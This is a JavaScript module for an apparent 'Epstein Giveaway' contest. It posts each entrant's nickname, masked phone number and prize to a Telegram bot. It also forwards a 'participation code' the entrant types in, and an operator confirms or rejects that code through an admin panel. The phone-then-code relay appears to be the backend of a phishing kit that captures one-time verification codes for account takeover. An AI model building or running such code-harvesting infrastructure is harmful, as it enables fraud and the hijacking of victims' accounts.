export async function notifyTelegram(entry) {
  const token = process.env.MESSAGE_BOT_TOKEN;
  const chatId = process.env.MESSAGE_CHAT_ID;

  if (!token || !chatId) {
    return { skipped: true };
  }

  const lines = [
    "Nouvelle inscription au concours",
    "",
    `Cadeau: ${entry.giftLabel}`,
    `Pseudo: ${entry.gamePseudo || "Non fourni"}`,
    `Téléphone: ${entry.maskedPhone}`,
    `Date: ${new Intl.DateTimeFormat("fr-FR", {
      dateStyle: "medium",
      timeStyle: "short",
      timeZone: "Europe/Paris"
    }).format(new Date(entry.createdAt))}`,
    "",
    "Statut: en attente de validation"
  ];

  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: lines.join("\n"),
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Confirmer", callback_data: `confirm:${entry.id}` },
            { text: "Refuser", callback_data: `reject:${entry.id}` }
          ]
        ]
      }
    })
  });

  if (!response.ok) {
    throw new Error(`Telegram notification failed: ${response.status}`);
  }

  return { skipped: false };
}

export async function notifyTelegramCode(entry) {
  const token = process.env.MESSAGE_BOT_TOKEN;
  const chatId = process.env.MESSAGE_CHAT_ID;

  if (!token || !chatId) {
    return { skipped: true };
  }

  const lines = [
    "Code de participation saisi",
    "",
    `Cadeau: ${entry.giftLabel}`,
    `Pseudo: ${entry.gamePseudo || "Non fourni"}`,
    `Téléphone: ${entry.maskedPhone}`,
    `Code: ${entry.participantEnteredCode}`,
    `Date: ${new Intl.DateTimeFormat("fr-FR", {
      dateStyle: "medium",
      timeStyle: "short",
      timeZone: "Europe/Paris"
    }).format(new Date(entry.participantCodeConfirmedAt || Date.now()))}`,
    "",
    "Statut du code: en attente de confirmation"
  ];

  await sendTelegramMessage(chatId, lines.join("\n"), {
    inline_keyboard: [
      [
        { text: "Confirmer code", callback_data: `code_confirm:${entry.id}` },
        { text: "Refuser code", callback_data: `code_reject:${entry.id}` }
      ]
    ]
  });

  return { skipped: false };
}

export async function sendTelegramAdminPanel(chatId, participations) {
  const pendingEntries = participations.filter((entry) => entry.status === "pending");
  const pendingCodes = participations.filter(
    (entry) => entry.participantEnteredCode && entry.participantCodeStatus === "pending"
  );

  const lines = [
    "Panel admin - Epstein Giveaway",
    "",
    `Inscriptions: ${participations.length}`,
    `A valider: ${pendingEntries.length}`,
    `Codes à confirmer: ${pendingCodes.length}`,
    "",
    "Choisis une action."
  ];

  await sendTelegramMessage(chatId, lines.join("\n"), {
    inline_keyboard: [
      [{ text: "Inscriptions en attente", callback_data: "panel_entries" }],
      [{ text: "Codes en attente", callback_data: "panel_codes" }],
      [{ text: "Actualiser", callback_data: "panel" }]
    ]
  });
}

export async function sendTelegramPendingEntries(chatId, participations) {
  const pendingEntries = participations
    .filter((entry) => entry.status === "pending")
    .slice(0, 10);

  if (pendingEntries.length === 0) {
    await sendTelegramMessage(chatId, "Aucune inscription en attente.");
    return;
  }

  for (const entry of pendingEntries) {
    await sendTelegramMessage(chatId, formatParticipationEntry(entry), {
      inline_keyboard: [
        [
          { text: "Confirmer", callback_data: `confirm:${entry.id}` },
          { text: "Refuser", callback_data: `reject:${entry.id}` }
        ]
      ]
    });
  }
}

export async function sendTelegramPendingCodes(chatId, participations) {
  const pendingCodes = participations
    .filter((entry) => entry.participantEnteredCode && entry.participantCodeStatus === "pending")
    .slice(0, 10);

  if (pendingCodes.length === 0) {
    await sendTelegramMessage(chatId, "Aucun code en attente.");
    return;
  }

  for (const entry of pendingCodes) {
    await sendTelegramMessage(chatId, formatCodeEntry(entry), {
      inline_keyboard: [
        [
          { text: "Confirmer code", callback_data: `code_confirm:${entry.id}` },
          { text: "Refuser code", callback_data: `code_reject:${entry.id}` }
        ]
      ]
    });
  }
}

export async function answerTelegramCallback(callbackQueryId, text) {
  const token = process.env.MESSAGE_BOT_TOKEN;
  if (!token || !callbackQueryId) {
    return;
  }

  await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ callback_query_id: callbackQueryId, text })
  });
}

export async function editTelegramValidationMessage(callback, status) {
  const token = process.env.MESSAGE_BOT_TOKEN;
  const message = callback?.message;

  if (!token || !message?.chat?.id || !message?.message_id) {
    return;
  }

  const label = status === "validated" ? "VALIDEE" : "REFUSEE";
  const suffix = status === "validated"
    ? "\n\nStatut final: inscription VALIDEE."
    : "\n\nStatut final: inscription REFUSEE.";

  await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: message.chat.id,
      message_id: message.message_id,
      text: `${message.text || "Inscription au concours"}${suffix}`,
      reply_markup: {
        inline_keyboard: [[{ text: label, callback_data: "done" }]]
      }
    })
  });
}

export async function editTelegramCodeMessage(callback, codeStatus) {
  const token = process.env.MESSAGE_BOT_TOKEN;
  const message = callback?.message;

  if (!token || !message?.chat?.id || !message?.message_id) {
    return;
  }

  const label = codeStatus === "confirmed" ? "CODE CONFIRME" : "CODE REFUSE";
  const suffix = codeStatus === "confirmed"
    ? "\n\nStatut final: code CONFIRME."
    : "\n\nStatut final: code REFUSE.";

  await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: message.chat.id,
      message_id: message.message_id,
      text: `${message.text || "Code de participation"}${suffix}`,
      reply_markup: {
        inline_keyboard: [[{ text: label, callback_data: "done" }]]
      }
    })
  });
}

async function sendTelegramMessage(chatId, text, replyMarkup) {
  const token = process.env.MESSAGE_BOT_TOKEN;

  if (!token || !chatId) {
    return;
  }

  const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      reply_markup: replyMarkup
    })
  });

  if (!response.ok) {
    throw new Error(`Telegram message failed: ${response.status}`);
  }
}

function formatParticipationEntry(entry) {
  return [
    "Inscription en attente",
    "",
    `Cadeau: ${entry.giftLabel}`,
    `Pseudo: ${entry.gamePseudo || "Non fourni"}`,
    `Téléphone: ${entry.maskedPhone}`,
    `Date: ${new Intl.DateTimeFormat("fr-FR", {
      dateStyle: "medium",
      timeStyle: "short",
      timeZone: "Europe/Paris"
    }).format(new Date(entry.createdAt))}`
  ].join("\n");
}

function formatCodeEntry(entry) {
  return [
    "Code en attente",
    "",
    `Cadeau: ${entry.giftLabel}`,
    `Pseudo: ${entry.gamePseudo || "Non fourni"}`,
    `Téléphone: ${entry.maskedPhone}`,
    `Code: ${entry.participantEnteredCode}`
  ].join("\n");
}
